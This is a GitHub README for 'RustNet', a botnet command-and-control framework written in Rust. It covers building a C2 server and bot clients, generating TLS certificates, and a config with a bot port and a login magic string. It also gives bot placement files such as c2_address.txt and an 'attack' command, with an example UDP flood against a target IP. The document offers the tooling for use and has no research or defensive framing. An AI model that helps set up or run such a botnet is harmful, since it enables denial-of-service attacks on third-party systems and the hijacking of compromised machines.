| Login | Dashboard | User | Admin | Owner |
|-------|----------|----------|
| ![Login](https://github.com/user-attachments/assets/196e7a49-1244-4fc5-8e04-e6615a59eaa5) | ![Dashboard](https://github.com/user-attachments/assets/2a0c4b5b-2079-4116-8017-8ae07e0138d1) | ![User](https://github.com/user-attachments/assets/0ae15cea-5c40-45e5-babe-7b4bd928c1b3) |  | ![Admin](https://github.com/user-attachments/assets/c354de20-11ff-41eb-a91e-d5bdcd64aa0e)  | ![Owner](https://github.com/user-attachments/assets/f2c72fc3-b05b-45e4-9d33-556a73c1b78e)

## Key Features


This is an improved and more polished version of **BotnetGoV2**, redesigned from the ground up to be cleaner, faster, and easier to work with.

* **High-Performance Architecture** built for speed and scale.  
* **End-to-End Encryption** to keep all traffic secure and unreadable.  
* **Cross-Platform Support** for Linux (including WSL) and Windows.  
* **Modular System Design** so components stay easy to extend and maintain.  
* **Advanced Management Tools**, including:
  * Role-Based Access Control (Owner, Admin, Basic).
  * Real-time bot status, health checks, and telemetry.
  * SQLite-backed user accounts, roles, and audit logs.

## System Overview

### OpenSSL Requirements

OpenSSL is required for generating TLS certificates and enabling secure admin connections.

**Linux:**  
```bash
sudo apt install openssl libssl-dev
```

**Windows:**  
Install via **vcpkg** or **Chocolatey**.

## Server Setup

The server is the central controller. It needs a config file and TLS certificates before it can run.

### 1. Build the Server
```bash
cd server
cargo build --release
```

### 2. Generate TLS Certificates
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem  -days 365 -nodes -subj "/CN=RustNet Server"
```

### 3. Configuration
```toml
[server]
user_port = 1420
bot_port = 7002
enable_tls = true
login_magic_string = "loginforme"
```

### 4. Start the Server
```bash
./target/release/rustnet-server
```

## Client (Bot) Setup

### 1. Build the Client
```bash
cd client
cargo build --release
```

### 2. Required Files
`c2_address.txt` and `bot_token.txt` should be placed beside the client executable.

### 3. Start the Client
```bash
./target/release/rustnet-client
```

## Connecting to the Server

Use OpenSSL:
```bash
openssl s_client -connect localhost:1420 -quiet
```

## Running an Attack
```
attack <method> <target_ip> <port> <duration>
```

Example:
```
attack UDP 192.168.1.50 80 60
```

## License

MIT License. See `LICENSE`.
